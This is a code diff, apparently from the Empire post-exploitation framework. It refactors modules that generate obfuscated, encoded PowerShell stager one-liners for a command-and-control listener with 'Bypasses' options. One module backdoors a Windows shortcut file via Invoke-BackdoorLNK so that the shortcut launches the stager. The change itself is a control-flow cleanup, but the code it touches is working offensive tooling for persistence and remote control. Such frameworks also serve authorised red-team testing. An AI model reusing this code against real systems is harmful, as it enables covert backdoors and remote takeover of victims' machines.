@@ -37,20 +37,19 @@ class Module:
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
 
-        else:
-            # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagergenv2.generate_launcher(
-                listener_name=listener_name,
-                language="powershell",
-                encode=False,
-                obfuscate=launcher_obfuscate,
-                obfuscation_command=launcher_obfuscate_command,
-                user_agent=user_agent,
-                proxy=proxy,
-                proxy_creds=proxy_creds,
-                bypasses=params["Bypasses"],
-            )
-            launcher = launcher.replace("$", "`$")
+        # generate the PowerShell one-liner with all of the proper options set
+        launcher = main_menu.stagergenv2.generate_launcher(
+            listener_name=listener_name,
+            language="powershell",
+            encode=False,
+            obfuscate=launcher_obfuscate,
+            obfuscation_command=launcher_obfuscate_command,
+            user_agent=user_agent,
+            proxy=proxy,
+            proxy_creds=proxy_creds,
+            bypasses=params["Bypasses"],
+        )
+        launcher = launcher.replace("$", "`$")
 
         # read in the common module source code
         script, err = main_menu.modulesv2.get_module_source(
@@ -85,39 +84,34 @@ class Module:
                 else:
                     return handle_error_message("[!] File does not exist: " + ext_file)
 
+            elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
+                # not a valid listener, return nothing for the script
+                return handle_error_message("[!] Invalid listener: " + listener_name)
+
             else:
-                # if an external file isn't specified, use a listener
-                if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
-                    # not a valid listener, return nothing for the script
-                    return handle_error_message(
-                        "[!] Invalid listener: " + listener_name
-                    )
+                # generate the PowerShell one-liner with all of the proper options set
+                launcher = main_menu.stagergenv2.generate_launcher(
+                    listener_name=listener_name,
+                    language="powershell",
+                    encode=True,
+                    obfuscate=launcher_obfuscate,
+                    obfuscation_command=launcher_obfuscate_command,
+                    user_agent=user_agent,
+                    proxy=proxy,
+                    proxy_creds=proxy_creds,
+                    bypasses=params["Bypasses"],
+                )
 
-                else:
-                    # generate the PowerShell one-liner with all of the proper options set
-                    launcher = main_menu.stagergenv2.generate_launcher(
-                        listener_name=listener_name,
-                        language="powershell",
-                        encode=True,
-                        obfuscate=launcher_obfuscate,
-                        obfuscation_command=launcher_obfuscate_command,
-                        user_agent=user_agent,
-                        proxy=proxy,
-                        proxy_creds=proxy_creds,
-                        bypasses=params["Bypasses"],
-                    )
-
-                    encScript = launcher.split(" ")[-1]
-                    status_msg += "using listener " + listener_name
+                encScript = launcher.split(" ")[-1]
+                status_msg += "using listener " + listener_name
 
             script_end += f" -LNKPath '{lnk_path}'"
             script_end += f" -EncScript '{encScript}'"
             script_end += f"; \"Invoke-BackdoorLNK run on path '{lnk_path}' with stager for listener '{listener_name}'\""
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
